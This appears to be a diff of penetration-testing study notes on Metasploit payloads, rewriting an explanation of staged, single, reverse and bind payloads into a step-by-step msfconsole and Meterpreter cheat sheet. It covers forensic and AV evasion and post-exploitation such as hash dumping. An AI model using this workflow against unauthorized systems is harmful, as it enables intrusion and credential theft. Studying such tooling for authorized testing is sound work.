@@ -1,118 +1,114 @@
-# Metasploit Payloads: Types and Implementation
-
-### Payload Architecture
-
-Metasploit payloads are modules that work with exploits to return a shell or establish a foothold on a target. They are categorized by how they interact with the target system.
-
-|Payload Type|Description|Use Case|
-|:--|:--|:--|
-|**Singles (Inline)**|Self-contained; includes exploit and entire shellcode.|Use when **stability** is a priority and the exploit supports larger payload sizes.|
-|**Stagers (Stage0)**|Small code blocks that initialize a connection (Reverse or Bind).|Use to bypass **size limits** of an exploit or for **initial connection**.|
-|**Stages (Stage1)**|Large components downloaded by stagers; provide advanced features.|Use when **complex post-exploitation** (Meterpreter, VNC) is required.|
-
-**Decision Point:** Staged payloads are identified by a `/` in the name (e.g., `shell/reverse_tcp`), whereas singles are often joined by underscores (e.g., `shell_reverse_tcp`).
+1. Exploit buffer size is restricted or AV/IPS evasion is a priority; requires modular delivery of functions.
+2. Perimeter firewalls block inbound traffic; requires victim-initiated outbound connections to bypass strict filtering.
+3. Target allows direct inbound connections; suitable for bind payloads where the attacker connects to a listening port on the victim.
+4. Stability is preferred over modularity and the exploit supports large shellcode; use self-contained Single payloads.
+5. Advanced post-exploitation (DLL injection, memory-only residence, hash dumping) is required; use Meterpreter stages.
 
 ---
 
-### Connection Methodologies
+## Payload Architecture Discovery
 
-The choice of connection type depends on the target's network security posture.
+Target environment requires specific architecture or protocol; narrow down massive lists to relevant modules.
 
-#### 1. Reverse Connections
+List all available payloads for the current context
 
-The victim initiates an outbound connection to the attacker’s listener.
+```
+show payloads
+```
 
-- **Why use:** Most effective for bypassing **strict inbound firewall rules**.
-- **Implication:** Leverages the "security trust zone" typically granted to outbound traffic.
+Filter payloads by keyword to find specific features like Meterpreter
 
-#### 2. Bind Connections
+```
+grep meterpreter show payloads
+```
 
-The attacker initiates a connection to a port opened on the victim machine.
+Chain filters to isolate specific connection types and handlers
 
-- **Why use:** Useful when the attacker cannot receive inbound connections.
-- **Failure Condition:** Often blocked by firewalls enforcing **inbound filtering**.
+```
+grep meterpreter grep reverse_tcp show payloads
+```
 
----
+Identify the number of available modules matching criteria
 
-### Meterpreter Methodology
+```
+grep -c meterpreter show payloads
+```
 
-**Meterpreter** is a multi-faceted payload that operates via **DLL injection**.
+- Singles (Inline) -> `windows/shell_reverse_tcp` -> Prefer when stability is critical and buffer size is not an issue.
+- Staged -> `windows/shell/reverse_tcp` -> Prefer when needing to bypass size limits or modularize attack phases.
 
-- **Why it matters:** It resides entirely in **memory**, leaving no traces on the hard drive, which evades conventional forensic detection.
-- **Attack Implication:** It provides a stable, persistent connection and allows for dynamic loading of plugins (e.g., Mimikatz) for automated post-exploitation.
-- **Capabilities:** Includes keystroke capture, password hash collection, microphone tapping, and screenshotting.
+## Exploit and Payload Configuration
 
----
+Exploit module is selected and requires listener and target definitions.
 
-### Operational Workflow: Selecting and Running Payloads
+Apply a payload to the active exploit module using its index number
 
-1. **Identify Available Payloads** Filter the extensive payload list to find specific types (e.g., Windows x64 Meterpreter reverse TCP).
-    
-    ```
-    grep meterpreter grep reverse_tcp show payloads
-    ```
-    
-    _Note: Using `grep` significantly reduces selection time._
-    
-2. **Select the Payload** After choosing an exploit module, set the desired payload by index number or name.
-    
-    ```
-    set payload <PAYLOAD_NAME_OR_INDEX>
-    ```
-    
-3. **Configure Parameters** Check required options to identify necessary IP and port settings.
-    
-    ```
-    show options
-    ```
-    
-4. **Set Connection Details** Define the attacker and target information.
-    
-    ```
-    set LHOST <ATTACK_IP>
-    set LPORT <PORT>
-    set RHOSTS <TARGET_IP>
-    ```
-    
-5. **Execute the Attack** Launch the exploit to deliver the stager and await the stage download.
-    
-    ```
-    run
-    ```
-    
+```
+set payload <INDEX>
+```
 
----
+Identify required parameters for both the exploit and the selected payload
 
-### Command Reference
+```
+show options
+```
 
-#### Metasploit Interface
+Set the listener address for reverse connections
 
-|Command|Purpose|
-|:--|:--|
-|`show payloads`|Lists all payloads compatible with the current module/context.|
-|`grep <TERM> <COMMAND>`|Filters output for specific keywords.|
-|`grep -c <TERM> <COMMAND>`|Returns a count of matching results.|
-|`ifconfig`|Quickly identifies the `<ATTACK_IP>` within msfconsole.|
+```
+set LHOST <ATTACK_IP>
+```
 
-#### Meterpreter Session
+Set the target host address
 
-Used once a session is established to interact with the target.
+```
+set RHOSTS <TARGET_IP>
+```
 
-|Command|Purpose|
-|:--|:--|
-|`getuid`|Displays the user context Meterpreter is running under.|
-|`help`|Lists available post-exploitation commands (File system, Networking, Privs).|
-|`ls` / `cd`|Navigates the target file system within the Meterpreter environment.|
-|`shell`|Drops into the target's native Command Line Interface (CLI).|
+Initiate the attack sequence
 
----
+```
+run
+```
 
-### Common Windows Payloads
+- **LPORT in use**: The attack will fail if the local listener port is already bound to another process.
+- **Arch Mismatch**: Ensure `VERIFY_ARCH` is set to true to prevent sending incompatible shellcode to the target.
 
-| Payload                               | Type   | Goal                                              |
-| :------------------------------------ | :----- | :------------------------------------------------ |
-| `windows/x64/shell_reverse_tcp`       | Single | Direct reverse shell; stable, no stage download.  |
-| `windows/x64/shell/reverse_tcp`       | Staged | Modular reverse shell; bypasses size limits.      |
-| `windows/x64/exec`                    | Single | Executes a specific arbitrary command.            |
-| `windows/x64/meterpreter/reverse_tcp` | Staged | Full Meterpreter suite via reverse TCP.           |
-| `windows/x64/vncinject/reverse_tcp`   | Staged | Interactive VNC session via reflective injection. |
+## Meterpreter Post-Exploitation
+
+Successful session established; need to perform file system operations or elevate.
+
+Verify the current user context on the target
+
+```
+getuid
+```
+
+Spawn a native OS command shell from the session
+
+```
+shell
+```
+
+List directory contents on the remote system
+
+```
+ls
+```
+
+Navigate the remote file system
+
+```
+cd <FILE_PATH>
+```
+
+Display all available Meterpreter commands and loaded plugins
+
+```
+help
+```
+
+- **whoami** command: This is a Windows native command; it will **fail** in a Meterpreter prompt and should be run within a `shell` channel or replaced with `getuid`.
+- **Disk traces**: Standard shell payloads may touch disk; **Meterpreter resides entirely in memory**, making it harder to detect via forensics.
+
+> ⚠️ Gap: The source mentions Windows NX vs. NO-NX stagers but provides no criteria for selecting one over the other based on target memory protections.
